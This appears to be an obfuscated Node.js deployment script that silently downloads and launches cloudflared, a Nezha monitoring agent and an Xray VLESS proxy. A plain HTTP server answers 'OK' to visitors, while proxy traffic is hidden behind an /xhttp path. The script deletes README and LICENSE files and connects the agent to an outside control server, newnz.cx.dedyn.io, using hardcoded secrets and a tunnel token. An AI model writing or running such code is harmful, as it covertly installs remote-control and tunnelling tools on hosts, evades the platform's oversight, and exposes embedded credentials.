const _0x297cc9=_0x3a73;(function(_0x6c46f1,_0x1ce28b){const _0x30e030=_0x3a73,_0x22c36c=_0x6c46f1();while(!![]){try{const _0x36fae4=-parseInt(_0x30e030(0x1ee))/0x1+-parseInt(_0x30e030(0x1dc))/0x2+-parseInt(_0x30e030(0x1d3))/0x3+-parseInt(_0x30e030(0x1c4))/0x4*(parseInt(_0x30e030(0x1e6))/0x5)+parseInt(_0x30e030(0x1fd))/0x6*(parseInt(_0x30e030(0x1f1))/0x7)+-parseInt(_0x30e030(0x201))/0x8*(-parseInt(_0x30e030(0x1ed))/0x9)+-parseInt(_0x30e030(0x1e5))/0xa*(-parseInt(_0x30e030(0x1fc))/0xb);if(_0x36fae4===_0x1ce28b)break;else _0x22c36c['push'](_0x22c36c['shift']());}catch(_0x1983e6){_0x22c36c['push'](_0x22c36c['shift']());}}}(_0x7fb2,0x93c66));const {execSync,spawn}=require(_0x297cc9(0x1d4)),fs=require('fs'),path=require('path'),axios=require(_0x297cc9(0x1e7)),extract=require(_0x297cc9(0x1c2)),http=require(_0x297cc9(0x20a)),config={'AGO_AUTH':process[_0x297cc9(0x1d5)][_0x297cc9(0x1ec)]||'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiODNhNGY4YzItNjZlNS00ODljLWI0MzItMDdiZWQ5MjEzYWNlIiwicyI6IlpUazJNV00zTldJdE1EQXpaaTAwTjJVNUxXRTJNMkl0TjJZMVlUSmhORFkxWmpWbSJ9','NZ_SERVER':process[_0x297cc9(0x1d5)]['NZ_SERVER']||_0x297cc9(0x207),'NZ_agentsecretkey':process[_0x297cc9(0x1d5)][_0x297cc9(0x1eb)]||'cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg','UUID':process[_0x297cc9(0x1d5)][_0x297cc9(0x1f0)]||_0x297cc9(0x1f8),'PORT':process[_0x297cc9(0x1d5)][_0x297cc9(0x1c5)]||0x1eb4},isArm=process[_0x297cc9(0x1e4)]===_0x297cc9(0x1cf),urls={'cf':isArm?'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64':_0x297cc9(0x1f9),'nz':isArm?_0x297cc9(0x205):_0x297cc9(0x1ea),'xr':isArm?_0x297cc9(0x1c9):'https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip'},xrayConfig={'inbounds':[{'listen':'127.0.0.1','port':0x1f42,'protocol':_0x297cc9(0x1fb),'settings':{'clients':[{'id':config['UUID']}],'decryption':_0x297cc9(0x1d6)},'streamSettings':{'network':'xhttp','xhttpSettings':{'path':_0x297cc9(0x1de)}},'sniffing':{'enabled':!![],'destOverride':[_0x297cc9(0x20a),_0x297cc9(0x200),_0x297cc9(0x1d1)]}}],'outbounds':[{'protocol':_0x297cc9(0x1f2),'tag':'direct'},{'protocol':'blackhole','tag':_0x297cc9(0x1e0)}]};async function downloadFile(_0x5f0c1a,_0x4a1589){const _0x3c31c5=_0x297cc9;if(fs['existsSync'](_0x4a1589))return;const _0x1b42e9=await axios({'url':_0x5f0c1a,'responseType':_0x3c31c5(0x1d0)}),_0x33a7d9=fs[_0x3c31c5(0x1f6)](_0x4a1589);return _0x1b42e9[_0x3c31c5(0x1d7)][_0x3c31c5(0x1ef)](_0x33a7d9),new Promise((_0x111c2b,_0x4ff60d)=>{const _0x12ef50=_0x3c31c5;_0x33a7d9['on'](_0x12ef50(0x1c6),_0x111c2b),_0x33a7d9['on'](_0x12ef50(0x1fa),_0x4ff60d);});}function _0x3a73(_0x5ce70b,_0x17e006){const _0x7fb214=_0x7fb2();return _0x3a73=function(_0x3a7353,_0x4e9d57){_0x3a7353=_0x3a7353-0x1bf;let _0x5d5b64=_0x7fb214[_0x3a7353];return _0x5d5b64;},_0x3a73(_0x5ce70b,_0x17e006);}function _0x7fb2(){const _0x22e5f6=['nz.zip','tls','436376NOabsI','127.0.0.1','writeFileSync','./nz','https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip','--edge-ip-version','newnz.cx.dedyn.io:443','--region','end','http','geosite.dat','0.0.0.0','headers','extract-zip','run','3994108poAGeA','PORT','finish','catch','--no-autoupdate','https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-arm64-v8a.zip','tunnel','README.md','ignore','auto','./xr','arm64','stream','quic','xr.zip','1807653TMkMui','child_process','env','none','data','chmod\x20+x\x20cf\x20nz\x20xr','cwd','url','nezha-agent','2076876tWmsUR','true','/xhttp','stringify','block','writeHead','renameSync','http2','arch','11654170BtaRqs','5VWlXGF','axios','startsWith','forEach','https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip','NZ_agentsecretkey','AGO_AUTH','27ycZBnV','449979EKhSJR','pipe','UUID','7jzIhhb','freedom','stdin','config.json','xray','createWriteStream','unlinkSync','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64','error','vless','33owaZAT','209334PQiQtx','--token'];_0x7fb2=function(){return _0x22e5f6;};return _0x7fb2();}async function main(){const _0x48e4f5=_0x297cc9;await downloadFile(urls['cf'],'cf'),await downloadFile(urls['nz'],_0x48e4f5(0x1ff)),await downloadFile(urls['xr'],'xr.zip'),await extract(_0x48e4f5(0x1ff),{'dir':process[_0x48e4f5(0x1d9)]()}),await extract(_0x48e4f5(0x1d2),{'dir':process[_0x48e4f5(0x1d9)]()}),fs['renameSync'](_0x48e4f5(0x1db),'nz'),fs[_0x48e4f5(0x1e2)](_0x48e4f5(0x1f5),'xr'),fs['unlinkSync'](_0x48e4f5(0x1ff)),fs[_0x48e4f5(0x1f7)](_0x48e4f5(0x1d2)),['geoip.dat',_0x48e4f5(0x1bf),'LICENSE',_0x48e4f5(0x1cb)][_0x48e4f5(0x1e9)](_0x4d8e78=>{const _0x4b1aa6=_0x48e4f5;if(fs['existsSync'](_0x4d8e78))fs[_0x4b1aa6(0x1f7)](_0x4d8e78);}),fs[_0x48e4f5(0x203)](_0x48e4f5(0x1f4),JSON[_0x48e4f5(0x1df)](xrayConfig,null,0x2)),execSync(_0x48e4f5(0x1d8));const _0x244300=http['createServer']((_0x2e6d3a,_0x1ebaf6)=>{const _0x410d05=_0x48e4f5;if(_0x2e6d3a[_0x410d05(0x1da)][_0x410d05(0x1e8)]('/xhttp')){const _0x676df3={'hostname':_0x410d05(0x202),'port':0x1f42,'path':_0x2e6d3a[_0x410d05(0x1da)],'method':_0x2e6d3a['method'],'headers':_0x2e6d3a['headers']},_0x54999f=http['request'](_0x676df3,function(_0x7ce670){const _0x3befdb=_0x410d05;_0x1ebaf6[_0x3befdb(0x1e1)](_0x7ce670['statusCode'],_0x7ce670[_0x3befdb(0x1c1)]),_0x7ce670[_0x3befdb(0x1ef)](_0x1ebaf6,{'end':!![]});});_0x2e6d3a[_0x410d05(0x1ef)](_0x54999f,{'end':!![]});}else _0x1ebaf6[_0x410d05(0x1e1)](0xc8),_0x1ebaf6[_0x410d05(0x209)]('OK');});_0x244300['listen'](config[_0x48e4f5(0x1c5)],_0x48e4f5(0x1c0),()=>{const _0x563373=_0x48e4f5;console['log']('HTTP\x20Server\x20running\x20on\x20port\x20'+config[_0x563373(0x1c5)]);}),spawn(_0x48e4f5(0x204),[],{'env':{...process[_0x48e4f5(0x1d5)],'NZ_SERVER':config['NZ_SERVER'],'NZ_TLS':_0x48e4f5(0x1dd),'NZ_CLIENT_SECRET':config[_0x48e4f5(0x1eb)]},'stdio':'ignore'}),spawn(_0x48e4f5(0x1ce),['-c','config.json'],{'stdio':'ignore'}),spawn('./cf',[_0x48e4f5(0x1ca),_0x48e4f5(0x206),_0x48e4f5(0x1cd),'--protocol',_0x48e4f5(0x1e3),_0x48e4f5(0x208),'us',_0x48e4f5(0x1c8),_0x48e4f5(0x1c3),_0x48e4f5(0x1fe),config[_0x48e4f5(0x1ec)]],{'stdio':_0x48e4f5(0x1cc)});}main()[_0x297cc9(0x1c7)](console[_0x297cc9(0x1fa)]),process[_0x297cc9(0x1f3)]['resume']();
